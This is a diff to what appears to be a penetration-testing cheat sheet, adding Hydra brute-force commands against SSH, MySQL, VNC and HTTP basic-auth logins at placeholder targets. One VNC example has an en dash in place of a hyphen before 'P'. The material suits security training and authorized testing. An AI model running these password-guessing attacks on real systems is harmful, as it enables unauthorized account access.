@@ -28,6 +28,31 @@ hydra -l user -P passlist.txt ftp://192.168.0.1
 ```
 
 You can also use the `-t` flag to define the number of connects in parallel per target which is defaulted to 16, or use the `-m` flag for more options specific to each module.
+The uppercase flags are to be used when you want to use a list (when you don't know this credential), and the lowercase when you know this login information.
+
+- Basic HTTP auth :
+
+```bash
+hydra -C wordlist.txt TARGET_IP -s PORT http-get /
+```
+
+- SSH :
+
+```bash
+hydra -l alice -P password.txt -u -f ssh://TARGET_IP:PORT -t 4
+```
+
+- MySQL :
+
+```bash
+hydra -L user.txt -P password.txt -f mysql://TARGET_IP -V
+```
+
+- VNC :
+
+```bash
+hydra -l bob –P password.txt -s PORT TARGET_IP vnc
+```
 
 - Other examples :
 
